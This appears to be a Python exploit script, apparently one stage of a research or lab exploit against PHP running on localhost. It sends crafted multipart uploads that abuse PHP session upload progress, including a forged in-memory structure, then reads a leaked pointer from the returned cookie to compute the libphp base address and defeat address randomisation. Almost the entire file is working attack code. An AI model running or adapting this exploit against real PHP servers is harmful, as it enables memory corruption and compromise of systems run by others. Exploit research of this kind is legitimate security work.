import sys, os, struct, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E

URL = "http://127.0.0.1:18112/"
t = E.Target(URL, timeout=180.0, verbose=False)

parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
parts += [
    {"name": "PHPSESSID", "data": b"\x00"},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    {"name": "f", "filename": "a.txt", "data": b"A" * 64},
]
parts.append({"name": "big", "data": b"B" * int(256 * 1024 * 1024)})
r1 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=180)
time.sleep(0.5)

parts = [
    {"name": "PHPSESSID", "data": E.SID},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
]
for i in range(841):
    val = (f"v{i:04d}" + "x" * 44)[:48]
    parts.append({"name": str(1000 + i), "data": val.encode()})
forge = bytearray(b"A" * 79)
struct.pack_into("<Q", forge, 0x10, 0x1000)
forge[0x18] = ord("L")
parts.append({"name": "1999", "data": bytes(forge)})
r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=180)
raw = E.parse_cookie(r2)
print(f"Cookie: {len(raw)}B")
p = int.from_bytes(raw[8:16], "little")
print(f"raw[8:16] = 0x{p:x}")
dtor_offset = 0x49ec50
print(f"dtor_offset & 0xFFF = 0x{dtor_offset & 0xFFF:x}")
print(f"p & 0xFFF = 0x{p & 0xFFF:x}")
print(f"Match: {p & 0xFFF == dtor_offset & 0xFFF}")
if p & 0xFFF == dtor_offset & 0xFFF:
    base = p - dtor_offset
    print(f"libphp base = 0x{base:x}")
